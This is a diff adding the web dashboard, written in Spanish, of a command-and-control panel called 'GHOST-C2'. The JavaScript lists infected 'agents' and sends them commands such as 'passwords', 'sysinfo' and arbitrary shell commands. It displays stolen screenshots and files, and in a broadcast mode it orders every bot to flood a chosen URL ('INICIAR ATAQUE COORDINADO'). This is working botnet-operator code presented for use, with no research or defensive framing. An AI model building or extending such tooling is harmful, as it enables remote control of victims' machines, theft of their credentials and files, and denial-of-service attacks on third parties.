@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <title>GHOST-C2 | Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;700&family=JetBrains+Mono&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+    <div class="layout">
+        <aside class="sidebar">
+            <h2 id="agent-count">0 AGENTES ONLINE</h2>
+            <div id="agent-list">
+                <!-- Se llena con JS -->
+            </div>
+        </aside>
+
+        <main class="main">
+            <div class="terminal" id="terminal">
+                [GHOST-C2] Bienvenido. Seleccione un agente para comenzar la sesión de control...
+            </div>
+
+            <div class="input-area">
+                <input type="text" id="cmd-field" placeholder="Comando (passwords, sysinfo, shell <comando>)...">
+                <button onclick="sendCmd()">EJECUTAR</button>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        let currentAgent = null;
+
+        async function updateAgents() {
+            try {
+                const res = await fetch('/api/v1/agents');
+                const agents = await res.json();
+                const list = document.getElementById('agent-list');
+                list.innerHTML = '';
+
+                // Opción para controlar a TODOS
+                const allDiv = document.createElement('div');
+                allDiv.className = `agent-item ${currentAgent === 'all' ? 'active' : ''}`;
+                allDiv.style.border = '1px solid var(--accent)';
+                allDiv.onclick = () => selectAgent('all');
+                allDiv.innerHTML = `
+                    <h4><span class="status-online" style="background:var(--accent)"></span> CONTROLAR TODOS</h4>
+                    <p>Broadcast Mode</p>
+                `;
+                list.appendChild(allDiv);
+
+                let count = 0;
+                for (const id in agents) {
+                    count++;
+                    const agent = agents[id];
+                    const last_seen = new Date(agent.last_seen).toLocaleTimeString();
+                    const div = document.createElement('div');
+                    div.className = `agent-item ${currentAgent === id ? 'active' : ''}`;
+                    div.onclick = () => selectAgent(id);
+                    div.innerHTML = `
+                        <h4><span class="status-online"></span> ${agent.hostname}</h4>
+                        <p>${agent.os} | ${agent.ip}</p>
+                        <p style="font-size: 0.6rem; opacity: 0.5;">Última conexión: ${last_seen}</p>
+                    `;
+                    list.appendChild(div);
+                }
+                document.getElementById('agent-count').innerText = `${count} AGENTES ONLINE`;
+            } catch (e) { console.error(e); }
+        }
+
+        async function updateResults() {
+            if (!currentAgent) return;
+            try {
+                const res = await fetch(`/api/v1/results/${currentAgent}`);
+                const data = await res.json();
+                const terminal = document.getElementById('terminal');
+
+                // Si no hay datos (o se borraron), limpiar terminal
+                if (!data || Object.keys(data).length === 0) {
+                    terminal.innerHTML = '[SYSTEM] Historial limpio.';
+                    return;
+                }
+
+                terminal.innerHTML = '';
+                Object.values(data).sort((a, b) => a.timestamp > b.timestamp ? 1 : -1).forEach(item => {
+                    const block = document.createElement('div');
+                    let content = item.result;
+
+                    if (content.startsWith("[IMAGE_DATA]")) {
+                        const b64 = content.replace("[IMAGE_DATA]", "");
+                        content = `<img src="data:image/jpeg;base64,${b64}" style="max-width: 100%; border: 2px solid var(--primary); border-radius: 8px; margin-top: 10px;">`;
+                        block.innerHTML = `
+                            <div style="color: var(--primary); margin-top: 10px;">[${item.timestamp}] - CAPTURA RECIBIDA</div>
+                            ${content}
+                        `;
+                    } else if (content.startsWith("[FILE_DATA:")) {
+                        const filename = content.match(/\[FILE_DATA:(.*?)\]/)[1];
+                        const b64 = content.split("]")[1];
+                        const link = `data:application/octet-stream;base64,${b64}`;
+                        block.innerHTML = `
+                            <div style="color: var(--primary); margin-top: 10px;">[${item.timestamp}] - ARCHIVO RECIBIDO</div>
+                            <a href="${link}" download="${filename}" style="color: #0f0; text-decoration: underline;">DESCARGAR ${filename}</a>
+                        `;
+                    } else if (item.result.startsWith("> ")) {
+                        // Estilo para comandos del usuario
+                        block.innerHTML = `
+                            <div style="color: #00ff00; margin-top: 10px;">${item.timestamp} ${item.result}</div>
+                        `;
+                    } else {
+                        // Escape HTML tags to prevent XSS if displaying raw text
+                        content = content.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                        block.innerHTML = `
+                            <div style="color: var(--primary); margin-top: 10px;">[${item.timestamp}]</div>
+                            <pre style="white-space: pre-wrap; margin: 0; color: #fff;">${content}</pre>
+                        `;
+                    }
+                    terminal.appendChild(block);
+                });
+                terminal.scrollTop = terminal.scrollHeight;
+            } catch (e) { console.error(e); }
+        }
+
+        function selectAgent(id) {
+            currentAgent = id;
+            document.querySelectorAll('.agent-item').forEach(el => el.classList.remove('active'));
+
+            const terminal = document.getElementById('terminal');
+
+            if (id === 'all') {
+                terminal.innerHTML = `
+                    <div style="text-align:center; padding: 20px;">
+                        <h2 style="color:var(--accent)">MODO DE CONTROL MASIVO</h2>
+                        <p>Los comandos enviados aquí se ejecutarán en TODOS los agentes conectados.</p>
+                        
+                        <div style="border: 1px solid #333; padding: 20px; border-radius: 10px; margin-top: 20px; text-align: left;">
+                            <h3 style="color:#ff4444">⚠ Distributed Stress Test (DDOS)</h3>
+                            <label>Objetivo (URL):</label>
+                            <input type="text" id="ddos-target" placeholder="http://ejemplo.com" style="width:100%; padding:10px; margin: 10px 0; background:#222; border:1px solid #444; color:white;">
+                            <label>Duración (segundos):</label>
+                            <input type="number" id="ddos-time" value="60" style="width:100%; padding:10px; margin: 10px 0; background:#222; border:1px solid #444; color:white;">
+                            <button onclick="launchDDOS()" style="width:100%; background:#ff4444; color:white; padding:10px; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">INICIAR ATAQUE COORDINADO</button>
+                        </div>
+                    </div>
+                `;
+                updateAgents();
+            } else {
+                terminal.innerHTML = `[SYSTEM] Sesión abierta con ${id}. Cargando historial...`;
+                updateAgents();
+                updateResults();
+            }
+        }
+
+        function launchDDOS() {
+            const target = document.getElementById('ddos-target').value;
+            const time = document.getElementById('ddos-time').value;
+
+            if (!target) return alert("Ingresa una URL objetivo");
+            if (!time) return alert("Ingresa la duración");
+
+            // Usamos el nuevo comando nativo del payload
+            const cmd = `ddos ${target} ${time}`;
+
+            document.getElementById('cmd-field').value = cmd;
+            sendCmd();
+            alert(`Orden de ataque enviada a TODOS los agentes contra ${target} por ${time} segundos.`);
+        }
+
+
+        async function sendCmd() {
+            if (!currentAgent) return alert("Selecciona un agente primero.");
+            const input = document.getElementById('cmd-field');
+            const cmd = input.value.trim();
+            if (!cmd) return;
+
+            // Comando especial para limpiar
+            if (cmd === "clear") {
+                await fetch(`/api/v1/clear/${currentAgent}`, { method: 'POST' });
+                document.getElementById('terminal').innerHTML = '[SYSTEM] Historial borrado.';
+                input.value = '';
+                return;
+            }
+
+            const res = await fetch('/api/v1/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: currentAgent, command: cmd })
+            });
+
+            if (res.ok) {
+                // No añadimos manualmente al DOM porque el servidor ahora lo guarda en 'results'
+                // y updateResults lo mostrará en el siguiente ciclo (3s).
+                // Pero para feedback inmediato, podemos poner un "Enviando..." temporal o dejar que el usuario espere.
+                // Dado que updateResults es rápido, lo dejamos así para evitar duplicados.
+                input.value = '';
+            }
+        }
+
+        // Listener para enviar con Enter
+        document.getElementById('cmd-field').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                sendCmd();
+            }
+        });
+
+
+        setInterval(updateAgents, 5000);
+        setInterval(updateResults, 3000);
+    </script>
+</body>
+
+</html>
